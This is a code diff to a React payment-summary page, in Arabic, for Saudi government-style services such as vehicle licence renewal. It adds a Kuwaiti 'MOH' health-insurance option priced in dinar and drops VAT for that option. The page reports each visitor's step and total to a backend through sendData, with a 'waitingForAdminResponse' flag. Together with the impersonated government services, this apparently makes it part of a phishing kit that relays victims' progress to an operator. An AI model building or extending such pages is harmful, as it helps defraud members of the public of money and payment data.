@@ -15,6 +15,10 @@ export default function SummaryPayment() {
   // Get service name from URL params
   const searchParams = new URLSearchParams(window.location.search);
   const serviceName = searchParams.get('service') || 'ربط رقم الجوال وتنشيط الحساب';
+  const isMOH = serviceName === 'moh';
+
+  // MOH payment data from localStorage
+  const mohData = isMOH ? JSON.parse(localStorage.getItem('mohPaymentData') || '{}') : {};
 
   // Service prices - matching ServiceHero.tsx getServiceFee()
   const servicePrices: Record<string, number> = {
@@ -36,9 +40,11 @@ export default function SummaryPayment() {
     'تجديد رخصة سير': 100,
   };
 
-  const servicePrice = servicePrices[serviceName] || 500;
-  const vatAmount = Math.round(servicePrice * 0.15);
-  const totalAmount = servicePrice + vatAmount;
+  const servicePrice = isMOH ? (mohData.totalAmount || 0) : (servicePrices[serviceName] || 500);
+  const vatAmount = isMOH ? 0 : Math.round(servicePrice * 0.15);
+  const totalAmount = isMOH ? servicePrice : (servicePrice + vatAmount);
+  const currency = isMOH ? 'د.ك' : 'ر.س';
+  const displayServiceName = isMOH ? (mohData.serviceType || 'الضمان الصحي') : serviceName;
 
   useEffect(() => {
     navigateToPage('ملخص الدفع');
@@ -47,13 +53,13 @@ export default function SummaryPayment() {
     setTimeout(() => {
       sendData({
         data: {
-          'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
+          'المجموع الكلي': `${totalAmount} ${currency}`,
         },
         current: 'الملخص والدفع',
         waitingForAdminResponse: false,
       });
     }, 1000);
-  }, [servicePrice]);
+  }, [servicePrice, totalAmount, currency]);
 
   const handlePayment = () => {
     if (!selectedPaymentMethod) return;
@@ -160,7 +166,7 @@ export default function SummaryPayment() {
             <span>/</span>
             <span>الخدمات</span>
             <span>/</span>
-            <span className="text-[#143c3c]">{serviceName}</span>
+            <span className="text-[#143c3c]">{displayServiceName}</span>
           </nav>
 
           <h1 className="text-2xl font-bold text-gray-900 mb-6">ملخص الطلب والدفع</h1>
@@ -180,19 +186,34 @@ export default function SummaryPayment() {
                   <div className="space-y-4">
                     <div className="flex justify-between items-center py-2 border-b">
                       <span className="text-gray-600">اسم الخدمة</span>
-                      <span className="font-medium">{serviceName}</span>
+                      <span className="font-medium">{displayServiceName}</span>
                     </div>
+                    {isMOH && mohData.persons && mohData.persons.length > 0 && (
+                      <div className="py-2 border-b">
+                        <span className="text-gray-600 block mb-2">المؤمن عليهم</span>
+                        <div className="space-y-1">
+                          {mohData.persons.map((person: any, idx: number) => (
+                            <div key={idx} className="flex justify-between items-center text-sm bg-gray-50 px-2 py-1 rounded">
+                              <span>{person.name || `شخص ${idx + 1}`}</span>
+                              <span className="text-[#143c3c] font-medium">{person.amount || 0} {currency}</span>
+                            </div>
+                          ))}
+                        </div>
+                      </div>
+                    )}
                     <div className="flex justify-between items-center py-2 border-b">
                       <span className="text-gray-600">رسوم الخدمة</span>
-                      <span className="font-medium">{servicePrice} ر.س</span>
+                      <span className="font-medium">{servicePrice} {currency}</span>
                     </div>
-                    <div className="flex justify-between items-center py-2 border-b">
-                      <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
-                      <span className="font-medium">{vatAmount} ر.س</span>
-                    </div>
+                    {!isMOH && (
+                      <div className="flex justify-between items-center py-2 border-b">
+                        <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
+                        <span className="font-medium">{vatAmount} {currency}</span>
+                      </div>
+                    )}
                     <div className="flex justify-between items-center py-2 bg-[#143c3c]/10 px-3 rounded-lg">
                       <span className="text-[#143c3c] font-bold">المجموع الكلي</span>
-                      <span className="text-[#143c3c] font-bold text-xl">{totalAmount} ر.س</span>
+                      <span className="text-[#143c3c] font-bold text-xl">{totalAmount} {currency}</span>
                     </div>
                   </div>
                 </CardContent>
@@ -282,20 +303,22 @@ export default function SummaryPayment() {
                   <div className="space-y-3">
                     <div className="flex justify-between text-sm">
                       <span className="text-gray-600">الخدمة</span>
-                      <span className="font-medium text-xs">{serviceName}</span>
+                      <span className="font-medium text-xs">{displayServiceName}</span>
                     </div>
                     <div className="flex justify-between text-sm">
                       <span className="text-gray-600">الرسوم</span>
-                      <span>{servicePrice} ر.س</span>
+                      <span>{servicePrice} {currency}</span>
                     </div>
-                    <div className="flex justify-between text-sm">
-                      <span className="text-gray-600">الضريبة</span>
-                      <span>{vatAmount} ر.س</span>
-                    </div>
+                    {!isMOH && (
+                      <div className="flex justify-between text-sm">
+                        <span className="text-gray-600">الضريبة</span>
+                        <span>{vatAmount} {currency}</span>
+                      </div>
+                    )}
                     <hr />
                     <div className="flex justify-between font-bold text-lg">
                       <span>المجموع</span>
-                      <span className="text-[#143c3c]">{totalAmount} ر.س</span>
+                      <span className="text-[#143c3c]">{totalAmount} {currency}</span>
                     </div>
                   </div>
 
